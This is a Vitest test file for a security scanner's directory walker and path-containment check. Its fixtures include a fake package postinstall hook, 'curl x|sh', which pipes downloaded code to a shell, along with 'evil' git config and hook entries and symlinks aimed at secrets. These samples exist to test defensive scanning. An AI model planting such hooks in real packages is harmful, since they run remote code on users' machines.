import { describe, expect, test } from 'vitest';
import { DEFAULT_LIMITS } from '../../src/config/settings';
import { isInside } from '../../src/scan/paths';
import { walk } from '../../src/scan/walker';
import { CANARY, link, put, sandbox } from './tree';

const opts = { includeGitConfig: false, nodeModules: 'skip' as const };
const all = (r: Awaited<ReturnType<typeof walk>>) => JSON.stringify(r);

describe('walk', () => {
  test('reads files with POSIX relative paths', async () => {
    const { root } = sandbox();
    put(root, 'a/b/c.txt', 'hello');
    const r = await walk(root, DEFAULT_LIMITS, opts);
    expect(r.files).toEqual([{ path: 'a/b/c.txt', text: 'hello', binary: false, size: 5, truncated: false }]);
  });

  test('skips symlinks; canary content never in output', async () => {
    const { root, canary, base } = sandbox();
    link(root, 'leak.txt', canary);
    link(root, 'dir', base);
    link(root, 'rel.txt', '../secret.txt');
    const r = await walk(root, DEFAULT_LIMITS, opts);
    expect(r.files).toEqual([]);
    expect(all(r)).not.toContain(CANARY);
  });

  test('skips .git entirely unless includeGitConfig', async () => {
    const { root } = sandbox();
    put(root, '.git/config', '[core]\n\tfsmonitor = evil');
    put(root, '.git/objects/ab/cdef', 'blob');
    put(root, '.git/hooks/pre-commit', '#!/bin/sh\nevil');
    put(root, '.git/hooks/pre-push.sample', 'sample');
    expect((await walk(root, DEFAULT_LIMITS, opts)).files).toEqual([]);
    const r = await walk(root, DEFAULT_LIMITS, { ...opts, includeGitConfig: true });
    expect(r.files.map((f) => f.path).sort()).toEqual(['.git/config', '.git/hooks/pre-commit']);
  });

  test('file > maxFileBytes is truncated and flagged', async () => {
    const { root } = sandbox();
    put(root, 'big.txt', 'x'.repeat(100));
    const r = await walk(root, { ...DEFAULT_LIMITS, maxFileBytes: 10 }, opts);
    expect(r.files[0]).toMatchObject({ text: 'x'.repeat(10), size: 100, truncated: true });
  });

  test('lockfiles get a higher per-file cap (16 MiB); other files keep maxFileBytes', async () => {
    const { root } = sandbox();
    const twoMiB = 'x'.repeat(2 * 1024 * 1024);
    put(root, 'package-lock.json', twoMiB);
    put(root, 'sub/yarn.lock', twoMiB);
    put(root, 'data.txt', twoMiB);
    const r = await walk(root, DEFAULT_LIMITS, opts);
    const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
    expect(by['package-lock.json']).toMatchObject({ size: twoMiB.length, truncated: false });
    expect(by['sub/yarn.lock']).toMatchObject({ truncated: false });
    expect(by['data.txt']).toMatchObject({ truncated: true });
    expect(by['data.txt']?.text?.length).toBe(DEFAULT_LIMITS.maxFileBytes);
  });

  test('a lockfile past 16 MiB is still truncated and flagged', async () => {
    const { root } = sandbox();
    put(root, 'pnpm-lock.yaml', Buffer.alloc(17 * 1024 * 1024, 97));
    const r = await walk(root, DEFAULT_LIMITS, opts);
    expect(r.files[0]).toMatchObject({ path: 'pnpm-lock.yaml', truncated: true });
    expect(r.files[0]?.text?.length).toBe(16 * 1024 * 1024);
  });

  test('lockfile bytes still count toward maxTotalBytes', async () => {
    const { root } = sandbox();
    put(root, 'package-lock.json', 'x'.repeat(2 * 1024 * 1024));
    put(root, 'b.txt', 'y');
    const r = await walk(root, { ...DEFAULT_LIMITS, maxTotalBytes: 1024 * 1024 }, opts);
    expect(r.notChecked.join()).toContain('size limit');
  });

  test('maxFiles exceeded → notChecked contains "file limit"', async () => {
    const { root } = sandbox();
    for (let i = 0; i < 5; i++) put(root, `f${i}.txt`, 'a');
    const r = await walk(root, { ...DEFAULT_LIMITS, maxFiles: 3 }, opts);
    expect(r.files).toHaveLength(3);
    expect(r.notChecked.join()).toContain('file limit');
  });

  test('maxDepth exceeded → notChecked contains "depth limit"', async () => {
    const { root } = sandbox();
    put(root, 'a/b/c/d/deep.txt', 'a');
    const r = await walk(root, { ...DEFAULT_LIMITS, maxDepth: 2 }, opts);
    expect(r.files).toEqual([]);
    expect(r.notChecked.join()).toContain('depth limit');
  });

  test('maxTotalBytes exceeded → notChecked contains "size limit"', async () => {
    const { root } = sandbox();
    put(root, 'a.txt', 'x'.repeat(60));
    put(root, 'b.txt', 'x'.repeat(60));
    const r = await walk(root, { ...DEFAULT_LIMITS, maxTotalBytes: 100 }, opts);
    expect(r.files).toHaveLength(1);
    expect(r.notChecked.join()).toContain('size limit');
  });

  test('NUL in first 8192 bytes → binary, no text', async () => {
    const { root } = sandbox();
    put(root, 'bin.dat', Buffer.from([0x41, 0x00, 0x42]));
    const r = await walk(root, DEFAULT_LIMITS, opts);
    expect(r.files[0]).toMatchObject({ binary: true, size: 3 });
    expect(r.files[0]!.text).toBeUndefined();
  });

  test('decodes UTF-16 BOM files', async () => {
    const { root } = sandbox();
    put(root, 'le.txt', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('curl evil', 'utf16le')]));
    const be = Buffer.from('curl evil', 'utf16le').swap16();
    put(root, 'be.txt', Buffer.concat([Buffer.from([0xfe, 0xff]), be]));
    put(root, 'latin1.txt', Buffer.from([0x63, 0xe9, 0x74]));
    const r = await walk(root, DEFAULT_LIMITS, opts);
    const byPath = Object.fromEntries(r.files.map((f) => [f.path, f]));
    expect(byPath['le.txt']).toMatchObject({ binary: false, text: 'curl evil' });
    expect(byPath['be.txt']).toMatchObject({ binary: false, text: 'curl evil' });
    expect(byPath['latin1.txt']!.text).toBe('c\ufffdt');
  });

  test('committed node_modules: only package.json read + caution finding', async () => {
    const { root } = sandbox();
    put(root, 'node_modules/evil/package.json', '{"scripts":{"postinstall":"curl x|sh"}}');
    put(root, 'node_modules/evil/index.js', 'payload');
    const r = await walk(root, DEFAULT_LIMITS, { ...opts, nodeModules: 'committed' });
    expect(r.files.map((f) => f.path)).toEqual(['node_modules/evil/package.json']);
    expect(r.findings).toEqual([expect.objectContaining({ ruleId: 'walker.committed-node-modules', severity: 'caution' })]);
  });

  test('installed node_modules skipped in workspace mode', async () => {
    const { root } = sandbox();
    put(root, 'node_modules/x/package.json', '{}');
    const r = await walk(root, DEFAULT_LIMITS, opts);
    expect(r.files).toEqual([]);
    expect(r.findings).toEqual([]);
  });
});

describe('isInside', () => {
  test('strictly inside only', () => {
    expect(isInside('/a', '/a/b', 'linux')).toBe(true);
    expect(isInside('/a', '/a', 'linux')).toBe(false);
    expect(isInside('/a', '/ab', 'linux')).toBe(false);
    expect(isInside('/a', '/a/../b', 'linux')).toBe(false);
    expect(isInside('/a/', '/a/b', 'linux')).toBe(true);
  });
  test('case-sensitive on linux', () => expect(isInside('/A', '/a/b', 'linux')).toBe(false));
  test('isInside handles win32 drive case', () => {
    expect(isInside('C:\\a', 'c:\\a\\b', 'win32')).toBe(true);
    expect(isInside('C:\\a', 'C:/a/b', 'win32')).toBe(true);
    expect(isInside('C:\\a', 'D:\\a\\b', 'win32')).toBe(false);
    expect(isInside('C:\\a', 'C:\\ab', 'win32')).toBe(false);
  });
});
